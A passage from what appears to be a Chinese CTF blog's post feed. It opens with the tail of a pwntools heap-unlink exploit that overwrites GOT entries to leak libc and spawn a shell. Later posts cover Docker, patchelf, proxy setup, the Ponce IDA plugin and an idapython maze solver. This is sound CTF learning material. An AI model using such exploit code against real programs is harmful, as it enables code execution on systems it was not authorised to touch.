p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Index ---&gt;&quot;</span>,index)</span><br><span class="line"><span class="comment">#应当注意，写内容的时候要sendafter而不是sendlineafter，否则会多出一个\n</span></span><br><span class="line">    </span><br><span class="line">chunk_ptr=<span class="number">0x6020c0</span></span><br><span class="line"></span><br><span class="line">create(<span class="string">&quot;64&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">create(<span class="string">&quot;128&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">create(<span class="string">&quot;128&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">create(<span class="string">&quot;128&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">create(<span class="string">&quot;128&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment">#随便多申请了几个</span></span><br><span class="line">puts_plt=elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got=elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(atoi_got))</span><br><span class="line">fake_fd=chunk_ptr-<span class="number">0x18</span></span><br><span class="line">fake_bk=chunk_ptr-<span class="number">0x10</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x40</span>)+p64(fake_fd)+p64(fake_bk)+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">64</span>-<span class="number">32</span>)+p64(<span class="number">0x40</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;160&quot;</span>,payload)<span class="comment">#伪造fake_chunk</span></span><br><span class="line">delete(<span class="string">&quot;1&quot;</span>)<span class="comment">#unlink</span></span><br><span class="line"><span class="comment">#unlink success</span></span><br><span class="line">payload1=<span class="string">&quot;&quot;</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(puts_got)+p64(atoi_got)+p64(free_got)</span><br><span class="line">edit(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;160&quot;</span>,payload1)</span><br><span class="line">edit(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;160&quot;</span>,p64(puts_plt))</span><br><span class="line">delete(<span class="string">&quot;0&quot;</span>) <span class="comment">#leak puts_addr</span></span><br><span class="line">t=p.recv(<span class="number">1</span>) <span class="comment">#接收一个回车字符</span></span><br><span class="line">r=p.recv(<span class="number">6</span>)</span><br><span class="line">puts_addr=u64(r.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#print(&quot;libc_addr:&quot;,hex(libc_addr))</span></span><br><span class="line"><span class="comment">#print(&quot;r:&quot;,r)</span></span><br><span class="line"><span class="comment">#print(&quot;puts_addr:&quot;,hex(puts_addr))</span></span><br><span class="line"><span class="comment">#print(&quot;sym_puts:&quot;,hex(libc.sym[&#x27;puts&#x27;]))</span></span><br><span class="line"><span class="comment">#print(&quot;libc_addr:&quot;,hex(libc_addr))</span></span><br><span class="line">system_addr=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;160&quot;</span>,p64(system_addr))</span><br><span class="line">payload2=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">edit(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;160&quot;</span>,payload2)</span><br><span class="line">delete(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>被迫学习docker</title>
      <link href="/2024/04/09/2024-04-09-%E8%A2%AB%E8%BF%AB%E5%AD%A6%E4%B9%A0docker/"/>
      <url>/2024/04/09/2024-04-09-%E8%A2%AB%E8%BF%AB%E5%AD%A6%E4%B9%A0docker/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>就如标题所言，这篇文章是（被迫）学docker写出来的。</p><p>事情的起因是这样的，我最近在学堆，需要编译一个libc2.23的题目，问过pwn爹之后才知道，在本机时肯定不行 的，需要在docker里用ubuntu16.04编译。</p><p>于是就开始了docker的学习。</p><p>当然下面的docker学习仅限我能用就行（不够用了再学）</p><h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><blockquote><p><a href="https://zhuanlan.zhihu.com/p/675938110">https://zhuanlan.zhihu.com/p/675938110</a></p></blockquote><p>本着能用就行的原则，我选择了直接apt安装。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker.io docker-compose</span><br></pre></td></tr></table></figure><p>之后查看是否正确安装</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker -v</span><br></pre></td></tr></table></figure><h1 id="生成镜像"><a href="#生成镜像" class="headerlink" title="生成镜像"></a>生成镜像</h1><p>我们的镜像是基于ubuntu16.04的，因此首先要先拉取一个ubuntu16.04。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu:16.04</span><br></pre></td></tr></table></figure><p>现在我们本地已经有了ubuntu16.04镜像，之后就需要写dockerfile，docker通过dockerfile来生成我们需要的镜像。</p><p>我现在有了我需要编译程序的源代码，将其命名为fastbins.c，我需要用ubuntu16.04的gcc来编译这个文件，并命名为fastbin。</p><h2 id="写dockerfile"><a href="#写dockerfile" class="headerlink" title="写dockerfile"></a>写dockerfile</h2><p>通过询问gpt,就可以得到我们的dockerfile了。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用官方的Ubuntu镜像作为基础镜像</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装GCC编译器</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y gcc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将当前目录下的fastbins.c文件复制到容器的/app目录下</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> fastbins.c /app/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用GCC编译fa.c文件，并将可执行文件命名为fastbin</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gcc -o fastbin fastbins.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境变量，使得容器启动时可以直接运行fastbin程序</span></span><br><span class="line"><span class="keyword">ENV</span> PATH=<span class="string">&quot;/app:$&#123;PATH&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个默认的执行命令，这里我们什么也不做</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;bash&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>要注意，dockerfile要和fastbins.c放在同一个目录下。</p><h2 id="建立镜像"><a href="#建立镜像" class="headerlink" title="建立镜像"></a>建立镜像</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build -t my_first_docker .</span><br></pre></td></tr></table></figure><p>这句指令要在dockerfile所在的文件夹下使用。</p><p>my_first_docker是生成镜像的名称 </p><p>.表示要在当前文件夹下找dockerfile</p><p>因此dockerfile一定要命名成dockerfile。</p><p>成功之后，现在的我们就已经有了镜像了，之后的操作都是基于这个镜像的，多次调试的时候也不会需要我们从头再来。</p><p>如何查看我们生成的所有镜像？</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>这句指令可以查看所有镜像</p><p>如何删除镜像？</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker rmi images_id</span><br></pre></td></tr></table></figure><h1 id="生成容器"><a href="#生成容器" class="headerlink" title="生成容器"></a>生成容器</h1><blockquote><p><a href="https://www.bilibili.com/video/BV1e64y1F7pJ/?spm_id_from=333.337.search-card.all.click&vd_source=a85daf8eb54f32264d9f6976d087fe98">https://www.bilibili.com/video/BV1e64y1F7pJ/?spm_id_from=333.337.search-card.all.click&amp;vd_source=a85daf8eb54f32264d9f6976d087fe98</a></p></blockquote><p>这个视频讲了很多有用的东西。</p><p>现在我们已经有了镜像，生成容器就可以了。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it  my_first_docker</span><br></pre></td></tr></table></figure><p>这里的my_first_docker就是我们镜像的名字。</p><p>之后就会直接进入我们创建的容器的shell。</p><p>之后的操作都需要直到容器的id。我们可以这样查看</p><p>（新开一个shell)</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker ps </span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>第一个指令显示正在运行的容器，第二个指令会显示所有容器，包括已经停止的容器。</p><p>对于我来说，接下来需要把docker中我生成的fastbin转移到本机上来，还需要进行换库，因此需要libc-2.23.so和ld-2.23.so。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp e1r7y6:/app/fastbin /ctf</span><br></pre></td></tr></table></figure><p>其中这个e1r7y6是容器的id，&#x2F;app&#x2F;fastbin是docker中的文件路径，&#x2F;ctf是我本机的路径。</p><p>还要转移两个库文件。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> e1r7y6:/lib/x86-64-linux-gnu/libc-2.23.so /ctf</span><br><span class="line">docker <span class="built_in">cp</span> e1r7y6:/lib/x86-64-linux-gnu/ld-2.23.so /ctf</span><br></pre></td></tr></table></figure><p>容器的工作已经完成了，现在需要销毁容器。</p><p>首先，在已经进入容器的shell里</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>这样容器就停止运行了</p><p>之后需要移除容器</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> e1r7y6</span><br></pre></td></tr></table></figure><p>现在docker的使用已经可以满足我的需求了。</p><p>不过对于我来说，之后还需要换库。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">patchelf --set-interpreter ./ld-2.23.so ./libc-2.23.so</span></span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so ./fastbin</span><br><span class="line">patchelf --replace-needed libc.so.6 ./libc-2.23.so ./fastbin</span><br></pre></td></tr></table></figure><p>以前我换库都是这三条语句都用，但是这次换库失败了，通过询问pwn爹，怀疑第一句话可能patchelf出现了bug，损坏了库文件，但是只用后两条就可以了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些东西</title>
      <link href="/2024/03/13/2024-3-13-%E6%8A%A5%E9%94%99%E8%AE%B0%E5%BD%95_%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%88%E5%B8%8C%E6%9C%9B%EF%BC%89/"/>
      <url>/2024/03/13/2024-3-13-%E6%8A%A5%E9%94%99%E8%AE%B0%E5%BD%95_%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%88%E5%B8%8C%E6%9C%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="1-32位linux-server无法使用"><a href="#1-32位linux-server无法使用" class="headerlink" title="1 32位linux_server无法使用"></a>1 32位linux_server无法使用</h1><p>报错信息:</p><p>.&#x2F;linux_server: error while loading shared libraries: libstdc++.so.6: cannot open shared object file: No such file or directory</p><p>解决方法：</p><p><a href="https://blog.csdn.net/qin9800/article/details/106342940/">https://blog.csdn.net/qin9800/article/details/106342940/</a></p><p>sudo apt-get install lib32stdc++6</p><h1 id="2-终端不走clash代理"><a href="#2-终端不走clash代理" class="headerlink" title="2 终端不走clash代理"></a>2 终端不走clash代理</h1><blockquote><p><a href="https://www.cnblogs.com/tany-g/p/17783416.html">https://www.cnblogs.com/tany-g/p/17783416.html</a></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=http://127.0.0.1:7890</span><br><span class="line"></span><br><span class="line">export https_proxy=$http_proxy</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set http_proxy=http://127.0.0.1:7890</span><br><span class="line"></span><br><span class="line">set https_proxy=http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>这种解决方法是可以让当前这个终端走代理，如果不想每次都输入一遍的话就修改环境变量</p><h1 id="3-clash-for-linux"><a href="#3-clash-for-linux" class="headerlink" title="3 clash for linux"></a>3 clash for linux</h1><p>服务器买的国内的，导致必须得使用clash for linux了</p><blockquote><p><a href="https://github.com/wnlen/clash-for-linux">https://github.com/wnlen/clash-for-linux</a></p></blockquote><p>按照说明一步一步来就可以了，最后别忘了进入http:&#x2F;&#x2F;<ip>:9090&#x2F;ui 登录</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ponce学习</title>
      <link href="/2023/10/30/2023-10-30-ponce%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/10/30/2023-10-30-ponce%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近看n1ctf题解的时候看到了一个IDA插件，用来符号执行的，简单的理解就是一个更简单的angr，比angr使用要方便一点，叫做ponce。</p><blockquote><p><a href="https://github.com/illera88/Ponce">https://github.com/illera88/Ponce</a></p></blockquote><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>直接把Ponce编译好的版本全部粘贴到IDA的插件文件夹中即可。</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>Ponce是一个符号执行的工具，按照我的理解，符号执行就是将输入看作一个变量（符号），然后通过动态执行能够将这个变量所满足的所有约束条件找到，这些约束条件可能是某些比较复杂的加密比较，但总之肯定有某种约束条件，将所有的约束条件收集好后工具就可以自动算出这个变量应该是什么。</p><p>因此我们需要首先找到两个东西或者三个东西，一个是输入存放的位置，一个是最终正确错误的分支点。我们先将输入转变为符号，执行后到达正确错误的分支点时也就已经收集好了所有的约束条件，然后得出结果即可。</p><p>这里以一个例子来讲解一下Ponce的简单使用。</p><p>测试文件的源代码：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> input[<span class="number">50</span>];</span><br><span class="line"><span class="type">char</span> enc[]=&#123;<span class="number">0x56</span>,<span class="number">0x5c</span>,<span class="number">0x51</span>,<span class="number">0x57</span>,<span class="number">0x4b</span>,<span class="number">0x47</span>,<span class="number">0x58</span>,<span class="number">0x51</span>,<span class="number">0x44</span>,<span class="number">0x6f</span>,<span class="number">0x59</span>,<span class="number">0x43</span>,<span class="number">0x6f</span>,<span class="number">0x49</span>,<span class="number">0x5f</span>,<span class="number">0x45</span>,<span class="number">0x42</span>,<span class="number">0x6f</span>,<span class="number">0x56</span>,<span class="number">0x5c</span>,<span class="number">0x51</span>,<span class="number">0x57</span>,<span class="number">0xf</span>,<span class="number">0x4d</span>&#125;;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,input);</span><br><span class="line"><span class="type">int</span> len=<span class="built_in">strlen</span>(input);</span><br><span class="line"><span class="keyword">if</span>(len!=<span class="number">24</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">input[i]^=<span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">if</span>(input[i]!=enc[i])&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">// flag&#123;what_is_your_flag?&#125;</span></span><br></pre></td></tr></table></figure><p>首先在IDA里找到scanf的位置</p><p><img src="/../imgs/202310301917405.png" alt="image-20231030191651688"></p><p>在这里scanf后下个断点，其中[rbp+Str]就是存放输入的位置</p><p>然后找到判断的位置</p><p><img src="/../imgs/202310301918484.png" alt="image-20231030191824400"></p><p>在jz指令这里下个断点</p><p>然后开始动态调试，我们输入随便的字符串“123456789012345678901234”</p><p>然后程序断在了输入的位置</p><p><img src="/../imgs/202310301919299.png" alt="image-20231030191956323"></p><p>点击[rbp+Str]找到输入</p><p><img src="/../imgs/202310301921789.png" alt="image-20231030192113981"></p><p>选择符号化内存 Symbolize memory </p><p><img src="/../imgs/202310301922040.png" alt="image-20231030192217066"></p><p>如图即为已经符号化成功</p><p>然后按下F9程序运行，断在jz指令</p><p>这个指令就是判断某个字符是否正确的指令</p><p>点击这个指令，右键选择SMT solver -&gt; Negate and Inject to reach 0x……</p><p><img src="/../imgs/202310301928232.png" alt="image-20231030192531092"></p><p>这个选项的意思时否定当前分支，并注入代码使得程序走入0x4016a6这个分支，同时在下方的输出框里工具也会将此时已经确定的 符号内存 告诉我们</p><p><img src="/../imgs/202310301932692.png" alt="image-20231030193236558"></p><p>此时再按下F8，程序会走入正确的分支，这也就是注入代码然后走入正确分支，不需要手动修改EIP了。</p><p>接着继续按下F9，程序会循环，重新到这个jz指令，重复刚才的操作即可，如此即可得到所有的答案。</p><p><img src="/../imgs/202310301941828.png" alt="image-20231030194125681"></p><p>但是有时候会有bug发生，重新来一遍就好了。</p><p>在选择 Negate and Inject to reach 0x……时也可以选择Solve Fomula 但是此时需要自己手动修改EIP进入正确的分支。</p><h1 id="录制视频链接"><a href="#录制视频链接" class="headerlink" title="录制视频链接"></a>录制视频链接</h1><blockquote><p><a href="https://www.bilibili.com/video/BV13N411s7T2/?spm_id_from=333.337.search-card.all.click&vd_source=a85daf8eb54f32264d9f6976d087fe98">https://www.bilibili.com/video/BV13N411s7T2/?spm_id_from=333.337.search-card.all.click&amp;vd_source=a85daf8eb54f32264d9f6976d087fe98</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ponce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idapython中的图论bfs</title>
      <link href="/2023/09/21/2023-09-21-idapython%E4%B8%AD%E7%9A%84%E5%9B%BE%E8%AE%BAbfs/"/>
      <url>/2023/09/21/2023-09-21-idapython%E4%B8%AD%E7%9A%84%E5%9B%BE%E8%AE%BAbfs/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>例题是minLCTF2023中的一道maze_aot。参考wp为doctor3写的。</p><p>github上可以搜的到题目和wp。</p><p>在此主要分析doctor3写的idapython脚本，从而学习idapython。</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="/../imgs/202309211751188.png" alt="image-20230921175143023"></p><p><img src="/../imgs/202309211752508.png" alt="image-20230921175211489"></p><p><img src="/../imgs/202309211752917.png" alt="image-20230921175230612"></p><p><img src="/../imgs/202309211752596.png" alt="image-20230921175241371"></p><p><img src="/../imgs/202309211753205.png" alt="image-20230921175304225"></p><p><img src="/../imgs/202309211753646.png" alt="image-20230921175326335"></p><p><img src="/../imgs/202309211753263.png" alt="image-20230921175339354"></p><h1 id="idapython脚本分析"><a href="#idapython脚本分析" class="headerlink" title="idapython脚本分析"></a>idapython脚本分析</h1><p>我将doctor3写的wp脚本分为三个部分，每一个部分都会尽量详细地介绍。</p><p>可以通过IDA清晰地看到这个题目的难点。</p><p>第一部分脚本，我称之为生成图。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#原脚本</span></span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line">function_address = <span class="number">0x1500</span></span><br><span class="line"></span><br><span class="line">function = idaapi.get_func(function_address)</span><br><span class="line"></span><br><span class="line">graph = <span class="built_in">dict</span>()</span><br><span class="line">cfg = idaapi.FlowChart(function)</span><br><span class="line">exclusive_nodes = <span class="built_in">list</span>()</span><br><span class="line">target_length = <span class="number">65</span></span><br><span class="line">first = <span class="literal">None</span></span><br><span class="line">end = <span class="number">9177</span></span><br><span class="line">jmp_dict = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> block <span class="keyword">in</span> cfg:</span><br><span class="line">    graph[block.start_ea] = <span class="built_in">list</span>()</span><br><span class="line">    start_address = block.start_ea</span><br><span class="line">    end_address = block.end_ea</span><br><span class="line">    <span class="keyword">if</span> first <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Starting&quot;</span>)</span><br><span class="line">        first = start_address</span><br><span class="line">    ea = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> end_address - start_address &lt;= <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;found jmp block&quot;</span>)</span><br><span class="line">        exclusive_nodes.append(start_address)</span><br><span class="line">        <span class="keyword">for</span> succ <span class="keyword">in</span> block.succs():  <span class="comment"># is a jmp block, ignore it</span></span><br><span class="line">            graph[block.start_ea].append(succ.start_ea)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    tgt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (end_address - ea) != start_address:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> idc.GetDisasm(end_address - ea).startswith(<span class="string">&quot;jnz&quot;</span>):</span><br><span class="line">            <span class="comment"># print(int(idc.GetDisasm(end_address - ea)[-4::],16))</span></span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            tgt = <span class="built_in">int</span>(idc.GetDisasm(end_address - ea)[-<span class="number">4</span>::],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">elif</span> idc.GetDisasm(end_address - ea).startswith(<span class="string">&quot;jz&quot;</span>):</span><br><span class="line">            flag = <span class="number">2</span></span><br><span class="line">            tgt = <span class="built_in">int</span>(idc.GetDisasm(end_address - ea)[-<span class="number">4</span>::], <span class="number">16</span>)</span><br><span class="line">        ea += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> flag != <span class="number">0</span>:</span><br><span class="line">        jmp_dict[block.start_ea] = (flag,tgt)</span><br><span class="line">    <span class="keyword">for</span> succ <span class="keyword">in</span> block.succs():</span><br><span class="line">        graph[block.start_ea].append(succ.start_ea)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(jmp_dict)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function_address = <span class="number">0x1500</span></span><br><span class="line"></span><br><span class="line">function = idaapi.get_func(function_address)</span><br><span class="line">cfg = idaapi.FlowChart(function)</span><br></pre></td></tr></table></figure><p>这两句话很简单，得到maze_walk这个函数的对象，并生成函数流程图。</p><p>简单来说，就是将IDA中的我们认知的流程图告诉给机器。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">graph = <span class="built_in">dict</span>()</span><br><span class="line">exclusive_nodes = <span class="built_in">list</span>()</span><br><span class="line">first = <span class="literal">None</span></span><br><span class="line">end = <span class="number">9177</span></span><br><span class="line">jmp_dict = <span class="built_in">dict</span>()</span><br></pre></td></tr></table></figure><p>graph字中键为节点，值为 这个节点后继节点的列表。</p><p>exclusive_nodes 列表用来处理jmp块，因为在流程图中jmp块单独存在，但我们知道jmp其实是跟着先前的节点。</p><p>target_length目标长度，65是需要考虑特定程序做一下变化，等到自己写程序的时候就知道了。</p><p>first是首节点。</p><p>end&#x3D;9177是终点节点的定值，只不过是以10进制写出来的。</p><p>jmp_dict命名容易产生歧义，但是其目的是建立两个节点之间是如何跳转的“jnz”还是“jz”。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> block <span class="keyword">in</span> cfg:</span><br><span class="line">    graph[block.start_ea] = <span class="built_in">list</span>() <span class="comment">#值为一个列表，存储后继节点的开始地址</span></span><br><span class="line">    start_address = block.start_ea</span><br><span class="line">    end_address = block.end_ea</span><br><span class="line">    <span class="keyword">if</span> first <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Starting&quot;</span>)</span><br><span class="line">        first = start_address   <span class="comment">#将首节点生成出来</span></span><br><span class="line">    ea = <span class="number">0</span>                    <span class="comment"># 一个变量，用来遍历这个节点的所有指令，挑选出跳转指令</span></span><br><span class="line">    <span class="keyword">if</span> end_address - start_address &lt;= <span class="number">5</span>: <span class="comment">#判断当前节点是是jmp块</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;found jmp block&quot;</span>)</span><br><span class="line">        exclusive_nodes.append(start_address)  <span class="comment">#将jmp块列为排除节点</span></span><br><span class="line">        <span class="keyword">for</span> succ <span class="keyword">in</span> block.succs():  <span class="comment"># is a jmp block, ignore it</span></span><br><span class="line">            graph[block.start_ea].append(succ.start_ea) <span class="comment">#将当前jmp块的所有后继节点加入graph </span></span><br><span class="line">        <span class="keyword">continue</span> <span class="comment">#下面的是非jmp块应该执行的内容，jmp直接continue</span></span><br><span class="line">    flag = <span class="number">0</span>  <span class="comment">#判断从当前节点到部分后继节点是如何过去的,jnz还是jz</span></span><br><span class="line">    tgt = <span class="number">0</span>  <span class="comment">#后继节点的地址</span></span><br><span class="line">    <span class="keyword">while</span> (end_address - ea) != start_address:   </span><br><span class="line">        <span class="comment">#看循环最后有一个ea+=1，ea的作用是用end_address - ea来索引指令</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> idc.GetDisasm(end_address - ea).startswith(<span class="string">&quot;jnz&quot;</span>):<span class="comment">#某个指令是以jnz开头的</span></span><br><span class="line">            <span class="comment"># print(int(idc.GetDisasm(end_address - ea)[-4::],16))</span></span><br><span class="line">            flag = <span class="number">1</span>   <span class="comment">#标记为1</span></span><br><span class="line">            tgt = <span class="built_in">int</span>(idc.GetDisasm(end_address - ea)[-<span class="number">4</span>::],<span class="number">16</span>) <span class="comment">#记录下后继节点的开始地址</span></span><br><span class="line">        <span class="keyword">elif</span> idc.GetDisasm(end_address - ea).startswith(<span class="string">&quot;jz&quot;</span>):<span class="comment">#同上</span></span><br><span class="line">            flag = <span class="number">2</span></span><br><span class="line">            tgt = <span class="built_in">int</span>(idc.GetDisasm(end_address - ea)[-<span class="number">4</span>::], <span class="number">16</span>)</span><br><span class="line">        ea += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> flag != <span class="number">0</span>:   <span class="comment"># 当前节点是通过jz或jnz转移到别的节点的</span></span><br><span class="line">        jmp_dict[block.start_ea] = (flag,tgt) <span class="comment">#记录一下转移方式与地址</span></span><br><span class="line">    <span class="keyword">for</span> succ <span class="keyword">in</span> block.succs():</span><br><span class="line">        graph[block.start_ea].append(succ.start_ea) <span class="comment">#记录后继节点的开始位置</span></span><br></pre></td></tr></table></figure><p>总的来说，这部分作用是生成一个graph用来记录所有节点的后继节点，jmp_dict用来记录是如何到达的后继节点</p><p>第二部分脚本，是BFS跑最短路径。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">BFS</span>(<span class="params">grap, star</span>):  <span class="comment"># BFS算法</span></span><br><span class="line">    queue = []  <span class="comment"># 定义一个队列</span></span><br><span class="line">    seen = <span class="built_in">set</span>()  <span class="comment"># 建立一个集合，集合就是用来判断该元素是不是已经出现过</span></span><br><span class="line">    queue.append(star)  <span class="comment"># 将任一个节点放入</span></span><br><span class="line">    seen.add(star)  <span class="comment"># 同上</span></span><br><span class="line">    parent = &#123;star: <span class="literal">None</span>&#125;  <span class="comment"># 存放parent元素</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">len</span>(queue) &gt; <span class="number">0</span>):  <span class="comment"># 当队列里还有东西时</span></span><br><span class="line">        ver = queue.pop(<span class="number">0</span>)  <span class="comment"># 